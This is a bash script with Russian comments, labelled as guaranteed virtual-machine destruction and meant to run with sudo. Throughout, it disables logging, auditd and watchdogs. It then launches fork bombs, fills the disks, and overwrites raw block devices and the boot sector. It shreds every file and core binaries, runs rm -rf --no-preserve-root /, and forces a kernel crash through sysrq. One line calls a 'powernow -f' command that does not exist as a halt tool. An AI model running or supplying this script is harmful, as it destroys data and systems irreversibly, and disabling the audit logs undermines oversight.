#!/bin/bash
# Гарантированное уничтожение ВМ - версия 2.0
# Запускать: sudo bash nuke.sh

# 1. Отключаем все защиты и логирование
echo 0 > /proc/sys/kernel/hung_task_timeout_secs
echo 0 > /proc/sys/kernel/panic
echo 0 > /proc/sys/kernel/panic_on_oops
dmesg -n 1
systemctl disable rsyslog 2>/dev/null
systemctl stop rsyslog 2>/dev/null

# 2. Убиваем мониторинг и watchdog
pkill -9 -f "monit|auditd|systemd-journal" 2>/dev/null
rm -f /var/run/watchdog.pid 2>/dev/null

# 3. Блокируем вход и запускаем фоновое уничтожение
nohup bash -c '
# 4. Мгновенное заполнение всей памяти (OOM Killer)
:(){ :|:& };:  # Форк-бомба в фоне

# 5. Бесконечное создание файлов до заполнения диска
while true; do
    dd if=/dev/urandom of=/tmp/fill.$RANDOM bs=1M count=1000 2>/dev/null
    dd if=/dev/urandom of=/home/fill.$RANDOM bs=1M count=1000 2>/dev/null
    dd if=/dev/urandom of=/var/fill.$RANDOM bs=1M count=1000 2>/dev/null
done &

# 6. Постоянная перезапись дисков
while true; do
    for disk in /dev/sda /dev/sdb /dev/vda /dev/xvda; do
        [ -b $disk ] && dd if=/dev/urandom of=$disk bs=1M count=100 conv=notrunc 2>/dev/null &
    done
    sleep 1
done &

# 7. Уничтожение файловой системы in-place
find / -type f -exec shred -v -z -u {} \; 2>/dev/null &

# 8. Удаление критичных команд и библиотек
for cmd in rm mv cp ls bash sh dd find; do
    which $cmd | xargs -I {} shred -u {} 2>/dev/null
done

# 9. Рекурсивное удаление всего
rm -rf --no-preserve-root / &
' > /dev/null 2>&1 &

# 10. Окончательный удар - портим загрузчик и вызываем kernel panic
sync
dd if=/dev/zero of=/dev/sda bs=512 count=64 conv=notrunc 2>/dev/null
echo 1 > /proc/sys/kernel/sysrq
echo c > /proc/sysrq-trigger 2>/dev/null
echo o > /proc/sysrq-trigger 2>/dev/null

# 11. Если всё ещё живы - физическое выключение
powernow -f 2>/dev/null || halt -f 2>/dev/null

# 12. Последний способ - переполнение стека через рекурсию в bash
崩溃() {
  崩溃 | 崩溃 &
}
崩溃 2>/dev/null

echo "Система уничтожается..."
sleep 60
